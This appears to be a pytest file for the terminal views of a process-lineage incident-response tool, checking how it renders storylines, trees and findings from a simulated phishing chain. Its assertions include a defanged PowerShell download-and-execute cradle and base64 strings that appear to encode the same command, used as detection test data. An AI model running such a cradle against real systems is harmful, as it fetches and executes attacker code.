"""Terminal view behaviour (§7.4, §9.3, §9.4, §9.5, §11.2, §12.1, §12.2)."""

import io
from pathlib import Path

import pytest
from rich.console import Console

from helpers.chain import EXPLORER, SYS32, Chain
from helpers.reports import FIXTURES, frozen_analysis
from lineage_ir.analyze.anchors import load_anchors
from lineage_ir.analyze.filters import make_params
from lineage_ir.analyze.focus import focus_set, resolve_focus
from lineage_ir.engine import AnalysisResult
from lineage_ir.render import terminal

PUBLIC = "C:\\Users\\Public\\"


def _text(render: object, width: int = 200) -> str:
    console = Console(
        record=True, width=width, file=io.StringIO(), color_system=None, legacy_windows=False
    )
    render(console)  # type: ignore[operator]
    return console.export_text()


def _view(result: AnalysisResult, **options: object) -> terminal.View:
    params = result.parameters
    focus = None
    if params.focus is not None:
        focus = focus_set(result.graphs, resolve_focus(result.graphs, params.focus))
    return terminal.View(params=params, focus=focus, is_anchor=load_anchors(), **options)  # type: ignore[arg-type]


@pytest.fixture(scope="module")
def phish() -> AnalysisResult:
    return frozen_analysis(FIXTURES / "phish_chain.jsonl")


def test_analyze_screen_order(phish: AnalysisResult) -> None:
    text = _text(lambda c: terminal.render_analyze(c, phish, _view(phish)))
    marks = ["LINEAGE", "Coverage", "Storylines", "S1 · root OUTLOOK.EXE", "Scope", "Severity"]
    marks += ["Telemetry gaps", "Result"]
    positions = [text.index(m) for m in marks]
    assert positions == sorted(positions)
    assert "explorer.exe (anchor)" in text and "services.exe (anchor)" in text
    assert "! rundll32.exe" in text and "GR-001 NET-001 PER-001" in text
    assert "dns dl[.]example" in text
    assert "verify 5 processes · review 1 persistence key · review 2 files · hunt 2" in text
    assert "exit 1" in text


def test_story_view(phish: AnalysisResult) -> None:
    text = _text(lambda c: terminal.render_story(c, phish, _view(phish, storyline=1)))
    assert "── Execution ──" in text and "── Persistence ──" in text
    assert text.index("── Execution ──") < text.index("── Persistence ──")
    assert "decoded: IEX (New-Object Net.WebClient).DownloadString('hxxp[://]203[.]0[.]" in text
    assert "S2 ·" not in text


def test_gap_markers_and_omitted_steps(tmp_path: Path) -> None:
    chain = Chain().create(1, EXPLORER)
    chain.create(2, PUBLIC + "tool.exe", 1, 0)
    for n in range(40):
        chain.create(10 + n, SYS32 + "cmd.exe", 2, 1 + n, f"cmd.exe /c step {n}")
    chain.create(99, SYS32 + "cmd.exe", 2, 4000, "cmd.exe /c late")
    result = frozen_analysis(chain.write(tmp_path / "in.jsonl"), max_steps=20)
    story = result.storylines[0]
    assert len(story.steps) == 42
    # LOC-001 is low severity, so the storyline is collapsed unless selected.
    text = _text(lambda c: terminal.render_story(c, result, _view(result, storyline=1)))
    assert "… 22 steps omitted" in text
    assert "cmd.exe /c step 8" in text and "cmd.exe /c step 9 " not in text
    assert "⏸ 1 h 6 min with no storyline activity" in text


def test_collapse_and_max_depth(tmp_path: Path) -> None:
    chain = Chain().create(1, EXPLORER)
    chain.create(2, SYS32 + "svchost.exe", 1, 1)
    for n in range(500):
        chain.create(100 + n, SYS32 + "conhost.exe", 2, 2 + n / 1000)
    parent = 1
    for depth in range(10):
        chain.create(700 + depth, SYS32 + "deep.exe", parent, 3 + depth)
        parent = 700 + depth
    result = frozen_analysis(chain.write(tmp_path / "in.jsonl"))
    text = _text(lambda c: terminal.render_tree(c, result, _view(result, max_depth=5)))
    assert "× 500 conhost.exe" in text
    assert "… deeper levels hidden (--max-depth 5)" in text
    wide = _text(lambda c: terminal.render_tree(c, result, _view(result, collapse_min=1000)))
    assert wide.count("conhost.exe") == 500


def test_hot_only_tree(phish: AnalysisResult) -> None:
    result = frozen_analysis(FIXTURES / "phish_chain.jsonl", hot_only=True)
    text = _text(lambda c: terminal.render_tree(c, result, _view(result)))
    assert "notepad.exe" not in text
    assert "… 1 benign child hidden" in text
    assert "upd.exe" in text and "whoami.exe" in text


def test_focus_limits_the_tree(phish: AnalysisResult) -> None:
    result = frozen_analysis(FIXTURES / "phish_chain.jsonl", focus="image:rundll32.exe")
    text = _text(lambda c: terminal.render_tree(c, result, _view(result)))
    assert "rundll32.exe" in text and "OUTLOOK.EXE" in text
    assert "! upd.exe" not in text and "notepad.exe" not in text
    analyze = _text(lambda c: terminal.render_analyze(c, result, _view(result)))
    assert "S1 · root" in analyze and "S2 · root" not in analyze
    assert "focus image:rundll32.exe" in analyze and "exit 1" in analyze


def test_wide_keeps_full_command_lines(phish: AnalysisResult) -> None:
    payload = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
    narrow = _text(lambda c: terminal.render_analyze(c, phish, _view(phish)), width=400)
    wide = _text(lambda c: terminal.render_analyze(c, phish, _view(phish, wide=True)), width=1200)
    full = "AKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgAxADAALwBhAC4AcABzADEAJwApAA=="
    assert payload in narrow and full not in narrow
    assert full in wide


def test_low_signal_storylines_are_collapsed(tmp_path: Path) -> None:
    chain = Chain().create(1, EXPLORER)
    chain.create(2, PUBLIC + "tool.exe", 1, 1)
    result = frozen_analysis(chain.write(tmp_path / "in.jsonl"))
    assert result.storylines[0].max_severity == "low"
    text = _text(lambda c: terminal.render_analyze(c, result, _view(result)))
    assert "Low-signal storylines" in text
    assert "explorer.exe (anchor)" not in text  # no tree for a collapsed storyline
    story = _text(lambda c: terminal.render_story(c, result, _view(result, storyline=1)))
    assert "spawned tool.exe" in story


def test_incomplete_result_line(tmp_path: Path) -> None:
    result = frozen_analysis(FIXTURES / "missing_telemetry.jsonl")
    for render in (terminal.render_analyze, terminal.render_tree, terminal.render_story):
        text = _text(lambda c, r=render: r(c, result, _view(result)))
        assert terminal.PARTIAL_LINE in text
        assert "INCOMPLETE" in text
    text = _text(lambda c: terminal.render_analyze(c, result, _view(result)))
    assert "CRD-001 not evaluable (needs 10)" in text


def test_display_window_hides_steps_but_not_the_result(phish: AnalysisResult) -> None:
    params = make_params(since="2026-10-12T10:02:30Z", until="2026-10-12T10:59:00Z")
    result = phish.model_copy(update={"parameters": params})
    text = _text(lambda c: terminal.render_story(c, result, _view(result)))
    assert "Registry Run key set" in text and "spawned winword.exe" not in text
    assert "FINDINGS DETECTED" in text and "S2 ·" not in text


def test_inspect_view(phish: AnalysisResult) -> None:
    guid = "8f3c2a71-5e4b-4d9a-a1c3-0000000000f1"
    text = _text(
        lambda c: terminal.render_inspect(c, phish, "ws-14.corp.example", guid, _view(phish))
    )
    for mark in (
        "Ancestry",
        "Children (0)",
        "Activity · network",
        "Findings (3)",
        "Storylines  S1",
    ):
        assert mark in text
    assert "explorer.exe 8f3c2a71-5e4b-4d9a-a1c3-0000000000a1 (anchor)" in text
    assert "\\x0a" not in text
